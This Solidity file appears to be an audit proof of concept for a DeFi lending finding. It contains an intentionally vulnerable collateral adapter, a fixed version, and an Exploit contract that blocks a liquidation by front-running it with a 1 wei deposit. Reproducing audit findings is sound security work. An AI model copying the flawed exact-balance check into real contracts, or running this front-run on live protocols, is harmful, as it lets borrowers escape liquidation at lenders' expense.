// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — H-28 (Pashov, 2025-05-06)
    StabilityPool.liquidateBorrower requires validateLiquidationData, which
    is `_balances[user] == amount`. LendingPool.depositAsset still accepts a
    deposit after liquidation has started, so a 1 wei front-run makes the
    check fail and the collateral stays in the adapter.
*/

contract Token {
    string public symbol = "COL";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

error VaultPositionNotOpened();
error CollateralAndParamterDataMismatch();
error DepositsDisabledDuringLiquidation();

contract ERC20AssetAdapter {
    Token public token;
    address public lendingPool;
    address public stabilityPool;
    mapping(address => uint256) public balances;
    mapping(address => bool) public liquidating;

    constructor(Token _token) {
        token = _token;
    }

    function setPool(address pool) external {
        require(lendingPool == address(0), "pool set");
        lendingPool = pool;
    }

    function setStability(address pool) external {
        require(stabilityPool == address(0), "stability set");
        stabilityPool = pool;
    }

    function markLiquidating(address user) external {
        require(msg.sender == lendingPool, "pool");
        liquidating[user] = true;
    }

    function seedCollateral(address user, uint256 amount) external {
        require(msg.sender == lendingPool, "pool");
        require(amount > 0, "seed");
        balances[user] = amount;
        require(token.transferFrom(user, address(this), amount), "seed pull");
    }

    function validateLiquidationData(address user, bytes calldata data) external view returns (bool) {
        uint256 amount = abi.decode(data, (uint256));
        return balances[user] == amount;
    }

    function deposit(address user, bytes calldata data) external virtual {
        require(msg.sender == lendingPool, "onlyLendingPool");
        uint256 amount = abi.decode(data, (uint256));
        require(amount > 0, "ERC20Adapter: invalid amount");
        // @> VULN: deposit increases the borrower balance while liquidation is open, so the stored balance no longer equals the liquidator's amount
        balances[user] += amount;
        require(token.transferFrom(user, address(this), amount), "pull");
    }

    function seize(address user, uint256 amount) external {
        require(msg.sender == stabilityPool, "stability");
        balances[user] -= amount;
        require(token.transfer(stabilityPool, amount), "seize");
    }
}

contract ERC20AssetAdapterFixed is ERC20AssetAdapter {
    constructor(Token _token) ERC20AssetAdapter(_token) {}

    function deposit(address user, bytes calldata data) external override {
        require(msg.sender == lendingPool, "onlyLendingPool");
        if (liquidating[user]) revert DepositsDisabledDuringLiquidation();
        uint256 amount = abi.decode(data, (uint256));
        require(amount > 0, "ERC20Adapter: invalid amount");
        balances[user] += amount;
        require(token.transferFrom(user, address(this), amount), "pull");
    }
}

contract LendingPool {
    ERC20AssetAdapter public adapter;
    mapping(address => bool) public vaultOpened;

    constructor(ERC20AssetAdapter _adapter) {
        adapter = _adapter;
    }

    function openAndSeed(bytes calldata data) external {
        vaultOpened[msg.sender] = true;
        adapter.seedCollateral(msg.sender, abi.decode(data, (uint256)));
    }

    function beginLiquidation(address user) external {
        adapter.markLiquidating(user);
    }

    function depositAsset(address adapter_, bytes calldata data) external {
        if (!vaultOpened[msg.sender]) revert VaultPositionNotOpened();
        ERC20AssetAdapter(adapter_).deposit(msg.sender, data);
    }
}

contract StabilityPool {
    Token public token;
    uint256 public seized;

    constructor(Token _token) {
        token = _token;
    }

    function liquidateBorrower(address poolAdapter, address user, bytes calldata data) external {
        if (!ERC20AssetAdapter(poolAdapter).validateLiquidationData(user, data)) {
            revert CollateralAndParamterDataMismatch();
        }
        uint256 amount = abi.decode(data, (uint256));
        ERC20AssetAdapter(poolAdapter).seize(user, amount);
        seized = amount;
    }
}

contract Exploit {
    uint256 public constant SEED = 1000 ether;
    uint256 public constant FRONT = 1;

    Token public token;
    ERC20AssetAdapter public adapter;
    LendingPool public pool;
    StabilityPool public stability;
    bool public liquidationReverted;
    uint256 public locked;

    constructor() {
        token = new Token();
        adapter = new ERC20AssetAdapter(token);
        pool = new LendingPool(adapter);
        stability = new StabilityPool(token);
        adapter.setPool(address(pool));
        adapter.setStability(address(stability));
        token.mint(address(this), SEED + FRONT);
    }

    function run() external {
        token.approve(address(adapter), SEED + FRONT);
        pool.openAndSeed(abi.encode(SEED));
        require(adapter.balances(address(this)) == SEED, "seeded");
        require(token.balanceOf(address(adapter)) == SEED, "escrow");

        pool.beginLiquidation(address(this));
        require(adapter.liquidating(address(this)), "flag");

        pool.depositAsset(address(adapter), abi.encode(FRONT));
        require(adapter.balances(address(this)) == SEED + FRONT, "front-run");

        bytes memory data = abi.encode(SEED);
        (bool ok,) = address(stability).call(
            abi.encodeWithSelector(stability.liquidateBorrower.selector, address(adapter), address(this), data)
        );
        liquidationReverted = !ok;
        locked = token.balanceOf(address(adapter));

        require(liquidationReverted, "liquidated");
        require(stability.seized() == 0, "seized");
        require(locked == SEED + FRONT, "locked");
        require(adapter.balances(address(this)) == SEED + FRONT, "balance moved");
        require(!adapter.validateLiquidationData(address(this), data), "still matches");
    }
}
